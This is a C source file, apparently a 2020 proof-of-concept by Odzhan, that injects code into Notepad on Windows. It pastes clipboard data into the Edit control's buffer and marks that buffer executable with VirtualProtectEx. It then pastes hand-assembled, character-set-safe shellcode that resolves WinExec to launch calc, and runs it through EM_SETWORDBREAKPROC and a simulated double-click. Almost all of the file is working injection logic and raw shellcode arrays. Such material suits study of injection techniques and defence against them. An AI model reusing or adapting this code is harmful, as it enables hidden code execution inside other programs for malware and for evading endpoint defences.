/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

#include <windows.h>
#include <commctrl.h>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef union _w64_t {
    uint8_t  b[8];
    uint16_t h[4];
    uint32_t w[2];
    uint64_t q;
    void *p;
} w64_t;

// default is 1 second
#define WAIT_TIME 1000

// obtain process name from process id
PCHAR pid2name(DWORD pid) {
    HANDLE         ss;
    BOOL           r;
    PROCESSENTRY32 pe;
    PCHAR          str="N/A";
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (ss != INVALID_HANDLE_VALUE) {
      pe.dwSize = sizeof(PROCESSENTRY32);
      
      if(Process32First(ss, &pe)) {
        do {
          if (pe.th32ProcessID == pid) {
            str = pe.szExeFile;
            break;
          }
        } while (Process32Next(ss, &pe));
        CloseHandle(ss);
      }
    }
    return str;
}

// obtain process id from process name
DWORD name2pid(LPSTR ImageName) {
    HANDLE         ss;
    PROCESSENTRY32 pe;
    DWORD          pid=0;
    
    // create snapshot of system
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return 0;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(ss, &pe)){
      do {
        if (lstrcmpi(ImageName, pe.szExeFile)==0) {
          pid = pe.th32ProcessID;
          break;
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
    return pid;
}

// read base address of DLL loaded in remote process
LPVOID GetProcessModuleHandle(DWORD pid, LPCSTR lpModuleName) {
    HANDLE        ss;
    MODULEENTRY32 me;
    LPVOID        ba = NULL;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID == pid) {
          if(lstrcmpi(me.szModule, lpModuleName)==0) {
            ba = me.modBaseAddr;
            break;
          }
        }
      } while(Module32Next(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

// the max address for virtual memory on 
// windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF
#define MAX_ADDR 6

// only useful for CP_ACP codepage
static
int is_cp1252_allowed(int ch) {
  
    // zero is allowed, but we can't use it for the clipboard
    if(ch == 0) return 0;
    
    // bytes converted to double byte characters
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

// Allocate 64-bit buffer on the stack.
// Then place the address in RDI for writing.
#define STORE_ADDR_SIZE 10

char STORE_ADDR[] = {
  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x5d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
};

// Transfers control of execution to address on the stack
#define RET_SIZE 2

char RET[] = {
  /* 0000 */ "\xc3" /* ret  */
  /* 0002 */ "\x00"
};

#define CALC3_SIZE 164
#define RET_OFS 0x20 + 2

char CALC3[] = {
  /* 0000 */ "\xb0\x00"                 /* mov   al, 0                 */
  /* 0002 */ "\xc8\x00\x01\x00"         /* enter 0x100, 0              */
  /* 0006 */ "\x55"                     /* push  rbp                   */
  /* 0007 */ "\x00\x45\x00"             /* add   byte [rbp], al        */
  /* 000A */ "\x6a\x00"                 /* push  0                     */
  /* 000C */ "\x54"                     /* push  rsp                   */
  /* 000D */ "\x00\x45\x00"             /* add   byte [rbp], al        */
  /* 0010 */ "\x5d"                     /* pop   rbp                   */
  /* 0011 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0014 */ "\x57"                     /* push  rdi                   */
  /* 0015 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0018 */ "\x56"                     /* push  rsi                   */
  /* 0019 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 001C */ "\x53"                     /* push  rbx                   */
  /* 001D */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0020 */ "\xb8\x00\x4d\x00\xff"     /* mov   eax, 0xff004d00       */
  /* 0025 */ "\x00\xe1"                 /* add   cl, ah                */
  /* 0027 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 002A */ "\xb8\x00\x01\x00\xff"     /* mov   eax, 0xff000100       */
  /* 002F */ "\x00\xe5"                 /* add   ch, ah                */
  /* 0031 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0034 */ "\x51"                     /* push  rcx                   */
  /* 0035 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0038 */ "\x5b"                     /* pop   rbx                   */
  /* 0039 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 003C */ "\x6a\x00"                 /* push  0                     */
  /* 003E */ "\x54"                     /* push  rsp                   */
  /* 003F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0042 */ "\x5f"                     /* pop   rdi                   */
  /* 0043 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0046 */ "\x57"                     /* push  rdi                   */
  /* 0047 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 004A */ "\x59"                     /* pop   rcx                   */
  /* 004B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 004E */ "\x6a\x00"                 /* push  0                     */
  /* 0050 */ "\x54"                     /* push  rsp                   */
  /* 0051 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0054 */ "\x58"                     /* pop   rax                   */
  /* 0055 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0058 */ "\xc7\x00\x63\x00\x6c\x00" /* mov   dword [rax], 0x6c0063 */
  /* 005E */ "\x58"                     /* pop   rax                   */
  /* 005F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0062 */ "\x35\x00\x61\x00\x63"     /* xor   eax, 0x63006100       */
  /* 0067 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 006A */ "\xab"                     /* stosd                       */
  /* 006B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 006E */ "\x6a\x00"                 /* push  0                     */
  /* 0070 */ "\x54"                     /* push  rsp                   */
  /* 0071 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0074 */ "\x58"                     /* pop   rax                   */
  /* 0075 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0078 */ "\xc6\x00\x05"             /* mov   byte [rax], 5         */
  /* 007B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 007E */ "\x5a"                     /* pop   rdx                   */
  /* 007F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0082 */ "\x53"                     /* push  rbx                   */
  /* 0083 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0086 */ "\x6a\x00"                 /* push  0                     */
  /* 0088 */ "\x6a\x00"                 /* push  0                     */
  /* 008A */ "\x6a\x00"                 /* push  0                     */
  /* 008C */ "\x6a\x00"                 /* push  0                     */
  /* 008E */ "\x6a\x00"                 /* push  0                     */
  /* 0090 */ "\x53"                     /* push  rbx                   */
  /* 0091 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0094 */ "\x90"                     /* nop                         */
  /* 0095 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0098 */ "\x90"                     /* nop                         */
  /* 0099 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 009C */ "\x90"                     /* nop                         */
  /* 009D */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 00A0 */ "\x90"                     /* nop                         */
  /* 00A1 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
};

#define CALC4_SIZE 79
#define RET_OFS2 0x18 + 2

char CALC4[] = {
  /* 0000 */ "\x59"                 /* pop  rcx              */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0004 */ "\x59"                 /* pop  rcx              */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0008 */ "\x59"                 /* pop  rcx              */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 000C */ "\x59"                 /* pop  rcx              */
  /* 000D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0010 */ "\x59"                 /* pop  rcx              */
  /* 0011 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0014 */ "\x59"                 /* pop  rcx              */
  /* 0015 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0018 */ "\xb8\x00\x4d\x00\xff" /* mov  eax, 0xff004d00  */
  /* 001D */ "\x00\xe1"             /* add  cl, ah           */
  /* 001F */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0022 */ "\x51"                 /* push rcx              */
  /* 0023 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0026 */ "\x58"                 /* pop  rax              */
  /* 0027 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 002A */ "\xc6\x00\xc3"         /* mov  byte [rax], 0xc3 */
  /* 002D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0030 */ "\x59"                 /* pop  rcx              */
  /* 0031 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0034 */ "\x5b"                 /* pop  rbx              */
  /* 0035 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0038 */ "\x5e"                 /* pop  rsi              */
  /* 0039 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 003C */ "\x5f"                 /* pop  rdi              */
  /* 003D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0040 */ "\x59"                 /* pop  rcx              */
  /* 0041 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0044 */ "\x6a\x00"             /* push 0                */
  /* 0046 */ "\x58"                 /* pop  rax              */
  /* 0047 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 004A */ "\x5c"                 /* pop  rsp              */
  /* 004B */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 004E */ "\x5d"                 /* pop  rbp              */
};

static
u8* cp1252_generate_winexec(int pid, int *cslen) {
    int     i, ofs, outlen;
    u8      *cs, *out;
    HMODULE m;
    w64_t   addr;
    
    // it won't exceed 512 bytes
    out = (u8*)cs = VirtualAlloc(
      NULL, 4096, 
      MEM_COMMIT | MEM_RESERVE, 
      PAGE_EXECUTE_READWRITE);
    
    // initialize parameters for WinExec()
    memcpy(out, CALC3, CALC3_SIZE);
    out += CALC3_SIZE;

    // initialize RDI for writing
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;

    // ***********************************
    // store kernel32!WinExec on stack
    m = GetModuleHandle("kernel32");
    printf("  [+] Local Base address for kernel32 : %p\n", (PVOID)m);
    addr.q = ((PBYTE)GetProcAddress(m, "WinExec") - (PBYTE)m);
    m = GetProcessModuleHandle(pid, "kernel32.dll");
    printf("  [+] Remote Base address for kernel32 : %p\n", (PVOID)m);
    addr.q += (ULONG_PTR)m;
    
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte into AH
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr.b[i];
    
      // if byte not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      // store AH in [RDI], increment RDI
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // calculate length of constructed code
    ofs = (int)(out - (u8*)cs) + 2;
    
    // first offset
    cs[RET_OFS] = (uint8_t)ofs;
    
    memcpy(out, RET, RET_SIZE);
    out += RET_SIZE;
    
    memcpy(out, CALC4, CALC4_SIZE);
    
    // second offset
    ofs = CALC4_SIZE;
    ((u8*)out)[RET_OFS2] = (uint8_t)ofs;
    out += CALC4_SIZE;
    
    outlen = ((int)(out - (u8*)cs) + 1) & -2;

    FILE *fd = fopen("unicode.bin", "wb");
    fwrite(cs, 1, outlen, fd);
    fclose(fd);
    
    // convert to ascii
    for(i=0; i<=outlen; i+=2) {
      cs[i/2] = cs[i];
    }

    *cslen = outlen / 2;
    
    // save to file for inspection
    fd = fopen("ascii.bin", "wb");
    fwrite(cs, 1, *cslen, fd);
    fclose(fd);
    
    // return pointer to code
    return cs;
}

// copy data to the clipboard
BOOL CopyToClipboard(UINT format, void *data, int cch) {
    LPTSTR  str; 
    HGLOBAL gmem = NULL;
    BOOL    bResult = FALSE;
    HANDLE  hcb;
    
    if(!OpenClipboard(NULL)) {
      printf("  [-] %s : OpenClipboard() failed.\n", __FUNCTION__);
      return FALSE;
    }
    
    if(!EmptyClipboard()) {
      printf("  [-] %s : EmptyClipboard() failed.\n", __FUNCTION__);
      goto exit_copy;
    }
      
    gmem = GlobalAlloc(
      GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 8));
      
    if(gmem == NULL) {
      printf("  [-] %s : GlobalAlloc() failed.\n", __FUNCTION__);
      goto exit_copy;
    }
    
    str = GlobalLock(gmem); 
    if(str == NULL) {
      printf("  [-] %s : GlobalLock failed.\n", __FUNCTION__);
      goto exit_copy;
    }
    
    CopyMemory(str, data, cch); 
    GlobalUnlock(gmem);
    hcb = SetClipboardData(format, gmem);
    bResult = (hcb != NULL);
exit_copy:
    if(gmem != NULL) GlobalFree(gmem);
    CloseClipboard();
    return bResult;
}

#define WINEXEC_SIZE 197

char WINEXEC[] = {
  /* 0000 */ "\x56"                     /* push      rsi                           */
  /* 0001 */ "\x53"                     /* push      rbx                           */
  /* 0002 */ "\x57"                     /* push      rdi                           */
  /* 0003 */ "\x55"                     /* push      rbp                           */
  /* 0004 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0006 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 0008 */ "\x48\x29\xc4"             /* sub       rsp, rax                      */
  /* 000B */ "\x51"                     /* push      rcx                           */
  /* 000C */ "\x6a\x60"                 /* push      0x60                          */
  /* 000E */ "\x41\x5b"                 /* pop       r11                           */
  /* 0010 */ "\x65\x49\x8b\x03"         /* mov       rax, qword gs:[r11]           */
  /* 0014 */ "\x48\x8b\x40\x18"         /* mov       rax, qword [rax + 0x18]       */
  /* 0018 */ "\x48\x8b\x78\x10"         /* mov       rdi, qword [rax + 0x10]       */
  /* 001C */ "\xeb\x03"                 /* jmp       0x21                          */
  /* 001E */ "\x48\x8b\x3f"             /* mov       rdi, qword [rdi]              */
  /* 0021 */ "\x48\x8b\x5f\x30"         /* mov       rbx, qword [rdi + 0x30]       */
  /* 0025 */ "\x8b\x73\x3c"             /* mov       esi, dword [rbx + 0x3c]       */
  /* 0028 */ "\x44\x01\xde"             /* add       esi, r11d                     */
  /* 002B */ "\x8b\x4c\x33\x28"         /* mov       ecx, dword [rbx + rsi + 0x28] */
  /* 002F */ "\x67\xe3\xec"             /* jecxz     0x1e                          */
  /* 0032 */ "\x48\x8d\x74\x0b\x18"     /* lea       rsi, qword [rbx + rcx + 0x18] */
  /* 0037 */ "\xad"                     /* lodsd                                   */
  /* 0038 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 0039 */ "\x67\xe3\xe2"             /* jecxz     0x1e                          */
  /* 003C */ "\xad"                     /* lodsd                                   */
  /* 003D */ "\x41\x90"                 /* xchg      eax, r8d                      */
  /* 003F */ "\x49\x01\xd8"             /* add       r8, rbx                       */
  /* 0042 */ "\xad"                     /* lodsd                                   */
  /* 0043 */ "\x95"                     /* xchg      eax, ebp                      */
  /* 0044 */ "\x48\x01\xdd"             /* add       rbp, rbx                      */
  /* 0047 */ "\xad"                     /* lodsd                                   */
  /* 0048 */ "\x41\x91"                 /* xchg      eax, r9d                      */
  /* 004A */ "\x49\x01\xd9"             /* add       r9, rbx                       */
  /* 004D */ "\x8b\x74\x8d\xfc"         /* mov       esi, dword [rbp + rcx*4 - 4]  */
  /* 0051 */ "\x48\x01\xde"             /* add       rsi, rbx                      */
  /* 0054 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0056 */ "\x99"                     /* cdq                                     */
  /* 0057 */ "\xac"                     /* lodsb                                   */
  /* 0058 */ "\x01\xc2"                 /* add       edx, eax                      */
  /* 005A */ "\xc1\xca\x08"             /* ror       edx, 8                        */
  /* 005D */ "\xfe\xc8"                 /* dec       al                            */
  /* 005F */ "\x79\xf6"                 /* jns       0x57                          */
  /* 0061 */ "\x81\xfa\x47\x9a\x92\x1b" /* cmp       edx, 0x1b929a47               */
  /* 0067 */ "\xe0\xe4"                 /* loopne    0x4d                          */
  /* 0069 */ "\x75\xb3"                 /* jne       0x1e                          */
  /* 006B */ "\x41\x0f\xb7\x04\x49"     /* movzx     eax, word [r9 + rcx*2]        */
  /* 0070 */ "\x41\x8b\x04\x80"         /* mov       eax, dword [r8 + rax*4]       */
  /* 0074 */ "\x48\x01\xc3"             /* add       rbx, rax                      */
  /* 0077 */ "\x5a"                     /* pop       rdx                           */
  /* 0078 */ "\x4d\x31\xc0"             /* xor       r8, r8                        */
  /* 007B */ "\x4d\x31\xc9"             /* xor       r9, r9                        */
  /* 007E */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0080 */ "\x48\x89\x44\x24\x20"     /* mov       qword [rsp + 0x20], rax       */
  /* 0085 */ "\x48\x89\x44\x24\x28"     /* mov       qword [rsp + 0x28], rax       */
  /* 008A */ "\x48\x89\x44\x24\x30"     /* mov       qword [rsp + 0x30], rax       */
  /* 008F */ "\x48\x89\x44\x24\x38"     /* mov       qword [rsp + 0x38], rax       */
  /* 0094 */ "\x48\x8d\x7c\x24\x50"     /* lea       rdi, qword [rsp + 0x50]       */
  /* 0099 */ "\x48\x89\x7c\x24\x48"     /* mov       qword [rsp + 0x48], rdi       */
  /* 009E */ "\x48\x8d\x7c\x24\x60"     /* lea       rdi, qword [rsp + 0x60]       */
  /* 00A3 */ "\x48\x89\x7c\x24\x40"     /* mov       qword [rsp + 0x40], rdi       */
  /* 00A8 */ "\x31\xc9"                 /* xor       ecx, ecx                      */
  /* 00AA */ "\x6a\x68"                 /* push      0x68                          */
  /* 00AC */ "\x58"                     /* pop       rax                           */
  /* 00AD */ "\xab"                     /* stosd                                   */
  /* 00AE */ "\x48\x83\xe8\x04"         /* sub       rax, 4                        */
  /* 00B2 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 00B3 */ "\xf3\xaa"                 /* rep       stosb                         */
  /* 00B5 */ "\xff\xd3"                 /* call      rbx                           */
  /* 00B7 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00B9 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 00BB */ "\x48\x01\xc4"             /* add       rsp, rax                      */
  /* 00BE */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00C0 */ "\x5d"                     /* pop       rbp                           */
  /* 00C1 */ "\x5f"                     /* pop       rdi                           */
  /* 00C2 */ "\x5b"                     /* pop       rbx                           */
  /* 00C3 */ "\x5e"                     /* pop       rsi                           */
  /* 00C4 */ "\xc3"                     /* ret                                     */
};

BOOL em_inject(void) {
    HWND   npw, ecw;
    w64_t  emh, lastbuf, embuf;
    SIZE_T rd;
    HANDLE hp;
    DWORD  cslen, pid, old;
    BOOL   r;
    PBYTE  cs;
    
    char   buf[1024];
    
    // get window handle for notepad class
    npw = FindWindow("Notepad", NULL);
    if(npw == NULL) {
      printf("  [-] Unable to find Notepad. Is it running?\n");
      return FALSE;
    }
    
    // get window handle for edit control
    ecw = FindWindowEx(npw, NULL, "Edit", NULL);
    if(ecw == NULL) {
      printf("  [-] Unable to find Edit Control for Notepad.\n");
      return FALSE;
    }
    
    // get the EM handle for the edit control
    emh.p = (PVOID)SendMessage(ecw, EM_GETHANDLE, 0, 0);
    if(emh.p == NULL) {
      printf("  [-] Unable to read EM handle for %p\n", ecw);
      return FALSE;
    }
    
    // get the process id for the window and open the process
    if(GetWindowThreadProcessId(ecw, &pid) == 0) {
      printf("  [-] Unable to read process id for %p\n", ecw);
      return FALSE;
    }
    
    // copy some test data to the clipboard
    memset(buf, 0x4d, sizeof(buf));

    if(!CopyToClipboard(CF_TEXT, buf, sizeof(buf))) {
      printf("  [-] CopyToClipboard failed.\n");
      return FALSE;
    }
    
    // open the process for reading and changing memory permissions
    hp = OpenProcess(PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if(hp == NULL) {
      printf("  [-] Unable to open process for %p\n", ecw);
      return FALSE;
    }
    
    // loop until target buffer address is stable and meets our criteria
    // just spam the buufer until last 8-Bits are less than < calc3
    lastbuf.p = NULL;
    r = FALSE;
    
    for(;;) {
      printf("  [+] Reading address of buffer : ");       
      if(!ReadProcessMemory(hp, emh.p, 
        &embuf.p, sizeof(ULONG_PTR), &rd)) {
        printf("FAILED!\n");
        break;
      }
      
      printf("%p\n", embuf.p);
      
      // Address hasn't changed? exit loop
      if(embuf.p == lastbuf.p) {
        r = TRUE;
        printf("  [+] Buffer appears to be ready.\n");
        break;
      }
      // save this address
      lastbuf.p = embuf.p;
    
      // clear the contents of edit control
      SendMessage(ecw, EM_SETSEL, 0, -1);
      SendMessage(ecw, WM_CLEAR, 0, 0);
      
      // send the WM_PASTE message to the edit control
      // allow notepad some time to read the data from clipboard
      printf("  [+] Sending WM_PASTE to %p\n", (PVOID)ecw);
      SendMessage(ecw, WM_PASTE, 0, 0);
      Sleep(WAIT_TIME);
    }

    if(r) {
      printf("  [+] Setting %p to RWX...", embuf.p);
      if(VirtualProtectEx(hp, embuf.p, 
        4096, PAGE_EXECUTE_READWRITE, &old))
      {
        printf("OK.\n");
        
        printf("  [+] Generating shellcode for %p\n", embuf.p);
        cs = cp1252_generate_winexec(pid, &cslen);
        
        printf("  [+] Injecting %i bytes of shellcode with WM_PASTE.\n", cslen);
        CopyToClipboard(CF_TEXT, cs, cslen);
        
        printf("  [+] Clearing buffer.\n");
        SendMessage(ecw, EM_SETSEL, 0, -1);
        SendMessage(ecw, WM_CLEAR, 0, 0);
        
        SendMessage(ecw, WM_PASTE, 0, 0);
        Sleep(WAIT_TIME);
        
        printf("  [+] Setting EM_SETWORDBREAKPROC to shellcode at %p\n", embuf.p);
        SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);
   
        if(GetSystemMetrics(SM_SWAPBUTTON)) {
          printf("  [+] Mouse buttons are swapped.\n");
        }
        
        printf("  [+] Executing shellcode with WM_LBUTTONDBLCLK.\n");
        SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
        
        printf("  [+] Setting EM_SETWORDBREAKPROC to %p\n", NULL);
        SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
        
        printf("  [+] Setting %p to RW...", embuf.p);
        r = VirtualProtectEx(hp, embuf.p,
          4096, PAGE_READWRITE, &old);
          
        printf("%s\n", r ? "OK" : "FAILED");
      } else {
        printf("VirtualProtectEx error %i.\n", GetLastError());
      }
    }
    CloseHandle(hp);
    return r;
}

int main(int argc, char *argv[]) {
    if(!em_inject()) {
      printf("  [+] Running notepad...\n");
      WinExec("notepad", SW_SHOW);
      em_inject();
    }
    return 0;
}
